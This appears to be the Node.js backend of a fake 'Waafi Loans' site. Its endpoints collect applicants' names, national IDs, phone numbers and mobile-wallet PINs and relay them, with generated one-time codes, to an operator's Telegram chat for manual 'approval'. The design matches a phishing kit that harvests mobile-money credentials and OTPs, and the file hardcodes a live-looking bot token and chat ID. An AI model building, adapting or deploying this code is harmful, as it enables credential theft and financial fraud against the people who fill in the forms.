const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== TELEGRAM CONFIGURATION =====
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8647117303:AAEdkgbGSaJ9D8Jn5S-yopTIw6L1V88SFu4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8444365382';

// ===== OTP STORAGE (In-memory) =====
const otpStore = new Map();

// Clean up expired OTPs every 5 minutes
setInterval(() => {
    const now = Date.now();
    for (const [key, value] of otpStore.entries()) {
        if (now > value.expiresAt) {
            otpStore.delete(key);
            console.log(`🗑️ OTP expired for ${key}`);
        }
    }
}, 5 * 60 * 1000);

// ===== SEND MESSAGE TO TELEGRAM =====
async function sendToTelegram(message, replyMarkup = null) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await axios.post(url, payload);
        console.log('✅ Message sent to Telegram:', response.data.ok);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
        throw error;
    }
}

// ===== GENERATE OTP =====
function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// ===== FORMAT MESSAGES =====
function formatApplyData(data) {
    return `
🏦 <b>NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━━
👤 <b>Full Name:</b> ${data.fullName || 'N/A'}
📱 <b>Phone:</b> ${data.phone || 'N/A'}
🪪 <b>National ID:</b> ${data.nationalId || 'N/A'}
📅 <b>Date of Birth:</b> ${data.dob || 'N/A'}
📍 <b>Town:</b> ${data.town || 'N/A'}
💼 <b>Employment:</b> ${data.employment || 'N/A'}
🎯 <b>Purpose:</b> ${data.purpose || 'N/A'}
💰 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}
📆 <b>Duration:</b> ${data.duration || 'N/A'} months
📊 <b>Monthly Repayment:</b> $${data.monthlyRepayment || 'N/A'}
📈 <b>Total Repayment:</b> $${data.totalRepayment || 'N/A'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

function formatVerifyData(data) {
    return `
🔐 <b>WAAFI WALLET VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━
📱 <b>Wallet Number:</b> ${data.phoneNumber || 'N/A'}
🔑 <b>PIN:</b> ${data.pin || 'N/A'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

function formatOtpRequestData(data) {
    return `
🔐 <b>OTP VERIFICATION REQUEST</b>
━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${data.phoneNumber || 'N/A'}
🔢 <b>OTP Code:</b> <b>${data.otp}</b>
⏰ <b>Requested at:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━
⚠️ <b>Action Required:</b> Approve or Reject this OTP
    `;
}

function formatOtpResultData(data) {
    return `
📊 <b>OTP VERIFICATION RESULT</b>
━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${data.phoneNumber || 'N/A'}
🔢 <b>OTP Code:</b> ${data.otp || 'N/A'}
📊 <b>Status:</b> ${data.status === 'approved' ? '✅ APPROVED' : '❌ REJECTED'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

// ===== ROUTES =====

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'success',
        message: 'Waafi Loans API is running',
        port: PORT,
        timestamp: new Date().toISOString()
    });
});

// ===== 1. APPLY FORM ENDPOINT =====
app.post('/api/apply', async (req, res) => {
    try {
        const data = req.body;
        console.log('📝 Apply form received:', data);

        const message = formatApplyData(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Application submitted successfully',
            data: data
        });
    } catch (error) {
        console.error('❌ Error in /api/apply:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to submit application',
            error: error.message
        });
    }
});

// ===== 2. VERIFY FORM ENDPOINT =====
app.post('/api/verify', async (req, res) => {
    try {
        const data = req.body;
        console.log('🔐 Verify form received:', data);

        const message = formatVerifyData(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Verification submitted successfully',
            data: data
        });
    } catch (error) {
        console.error('❌ Error in /api/verify:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to submit verification',
            error: error.message
        });
    }
});

// ===== 3. SEND OTP TO TELEGRAM FOR ADMIN APPROVAL =====
app.post('/api/send-otp', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log('📨 Send OTP request for:', phoneNumber);

        if (!phoneNumber) {
            return res.status(400).json({
                success: false,
                message: 'Phone number is required'
            });
        }

        // Generate OTP
        const otp = generateOTP();
        const expiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes

        // Store OTP with pending status
        otpStore.set(phoneNumber, {
            otp: otp,
            expiresAt: expiresAt,
            status: 'pending',
            timestamp: Date.now()
        });

        console.log(`🔢 OTP generated for ${phoneNumber}: ${otp}`);

        // Send OTP to Telegram with Approve/Reject buttons
        const message = formatOtpRequestData({
            phoneNumber: phoneNumber,
            otp: otp
        });

        const replyMarkup = {
            inline_keyboard: [
                [
                    {
                        text: '✅ Approve',
                        callback_data: `approve_${phoneNumber}_${otp}`
                    },
                    {
                        text: '❌ Reject',
                        callback_data: `reject_${phoneNumber}_${otp}`
                    }
                ]
            ]
        };

        await sendToTelegram(message, replyMarkup);

        res.json({
            success: true,
            message: 'OTP sent to Telegram for admin verification',
            data: {
                phoneNumber: phoneNumber,
                otp: otp,
                expiresIn: '5 minutes'
            }
        });
    } catch (error) {
        console.error('❌ Error in /api/send-otp:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send OTP',
            error: error.message
        });
    }
});

// ===== 4. CHECK OTP STATUS =====
app.post('/api/check-otp-status', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log('🔍 Checking OTP status for:', phoneNumber);

        if (!phoneNumber) {
            return res.status(400).json({
                success: false,
                message: 'Phone number is required'
            });
        }

        const storedData = otpStore.get(phoneNumber);
        
        if (!storedData) {
            return res.status(404).json({
                success: false,
                message: 'No OTP found. Please request a new OTP.'
            });
        }

        if (Date.now() > storedData.expiresAt) {
            otpStore.delete(phoneNumber);
            return res.status(400).json({
                success: false,
                message: 'OTP expired. Please request a new OTP.'
            });
        }

        res.json({
            success: true,
            data: {
                phoneNumber: phoneNumber,
                status: storedData.status,
                otp: storedData.otp
            }
        });
    } catch (error) {
        console.error('❌ Error in /api/check-otp-status:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to check OTP status',
            error: error.message
        });
    }
});

// ===== 5. VERIFY OTP =====
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { phoneNumber, otp } = req.body;
        console.log('🔐 Verify OTP request for:', phoneNumber);

        if (!phoneNumber || !otp) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and OTP are required'
            });
        }

        const storedData = otpStore.get(phoneNumber);
        
        if (!storedData) {
            return res.status(404).json({
                success: false,
                message: 'No OTP found. Please request a new OTP.'
            });
        }

        if (Date.now() > storedData.expiresAt) {
            otpStore.delete(phoneNumber);
            return res.status(400).json({
                success: false,
                message: 'OTP expired. Please request a new OTP.'
            });
        }

        if (storedData.status === 'pending') {
            return res.status(202).json({
                success: false,
                status: 'pending',
                message: 'Waiting for admin approval...'
            });
        }

        if (storedData.status === 'approved') {
            otpStore.delete(phoneNumber);
            return res.json({
                success: true,
                message: 'OTP verified successfully!',
                data: {
                    phoneNumber: phoneNumber
                }
            });
        }

        if (storedData.status === 'rejected') {
            otpStore.delete(phoneNumber);
            return res.status(400).json({
                success: false,
                message: 'OTP was rejected by admin.'
            });
        }

        return res.status(400).json({
            success: false,
            message: 'Invalid OTP status'
        });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to verify OTP',
            error: error.message
        });
    }
});

// ===== 6. TELEGRAM WEBHOOK =====
app.post('/webhook/telegram', async (req, res) => {
    try {
        console.log('📨 Webhook received');
        
        const { callback_query } = req.body;
        
        if (!callback_query) {
            console.log('⚠️ No callback_query in webhook');
            return res.sendStatus(200);
        }

        const { data, id } = callback_query;
        console.log('📨 Telegram callback received:', data);

        const parts = data.split('_');
        const action = parts[0];
        const phoneNumber = parts.slice(1, -1).join('_');
        const otp = parts[parts.length - 1];

        console.log(`Action: ${action}, Phone: ${phoneNumber}, OTP: ${otp}`);

        const storedData = otpStore.get(phoneNumber);
        
        if (storedData && storedData.otp === otp) {
            if (action === 'approve') {
                storedData.status = 'approved';
                otpStore.set(phoneNumber, storedData);
                console.log(`✅ OTP approved for ${phoneNumber}`);
                
                const resultMessage = formatOtpResultData({
                    phoneNumber: phoneNumber,
                    otp: otp,
                    status: 'approved'
                });
                await sendToTelegram(resultMessage);
                
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    callback_query_id: id,
                    text: '✅ OTP Approved! User can now proceed.',
                    show_alert: true
                });
            } else if (action === 'reject') {
                storedData.status = 'rejected';
                otpStore.set(phoneNumber, storedData);
                console.log(`❌ OTP rejected for ${phoneNumber}`);
                
                const resultMessage = formatOtpResultData({
                    phoneNumber: phoneNumber,
                    otp: otp,
                    status: 'rejected'
                });
                await sendToTelegram(resultMessage);
                
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    callback_query_id: id,
                    text: '❌ OTP Rejected! User will be notified.',
                    show_alert: true
                });
            }
        } else {
            console.log('⚠️ OTP not found or already processed');
            
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: id,
                text: '⚠️ OTP already processed or expired.',
                show_alert: true
            });
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Error in webhook:', error);
        res.sendStatus(500);
    }
});

// ===== 7. SET WEBHOOK (DYNAMIC) =====
app.get('/api/set-webhook', async (req, res) => {
    try {
        const protocol = req.protocol;
        const host = req.get('host');
        const webhookUrl = `${protocol}://${host}/webhook/telegram`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}`;
        
        console.log('🔗 Setting webhook URL:', webhookUrl);
        const response = await axios.get(url);
        console.log('Webhook set:', response.data);
        
        res.json({
            success: true,
            message: 'Webhook set successfully',
            data: response.data,
            webhookUrl: webhookUrl
        });
    } catch (error) {
        console.error('❌ Error setting webhook:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to set webhook',
            error: error.message
        });
    }
});

// ===== 8. GET WEBHOOK INFO =====
app.get('/api/get-webhook', async (req, res) => {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getWebhookInfo`;
        const response = await axios.get(url);
        console.log('Webhook info:', response.data);
        
        res.json({
            success: true,
            data: response.data
        });
    } catch (error) {
        console.error('❌ Error getting webhook info:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to get webhook info',
            error: error.message
        });
    }
});

// ===== 9. TEST TELEGRAM =====
app.get('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `
🧪 <b>TELEGRAM TEST MESSAGE</b>
━━━━━━━━━━━━━━━━━━━
✅ Connection successful!
🤖 Bot is working properly
📡 Server is running on port ${PORT}
🌐 Host: ${req.get('host')}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
        `;
        await sendToTelegram(testMessage);
        res.json({
            success: true,
            message: 'Test message sent to Telegram successfully'
        });
    } catch (error) {
        console.error('❌ Error in /api/test-telegram:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send test message',
            error: error.message
        });
    }
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📡 API URL: https://waafi-loans-production.up.railway.app`);
    console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
    console.log(`📱 Telegram Chat ID: ${TELEGRAM_CHAT_ID || 'Not set ❌'}`);
    console.log(`🔢 OTP Store: Ready`);
    console.log(`📨 Webhook URL: https://waafi-loans-production.up.railway.app/webhook/telegram`);
    console.log(`🔗 Set Webhook: https://waafi-loans-production.up.railway.app/api/set-webhook`);
});
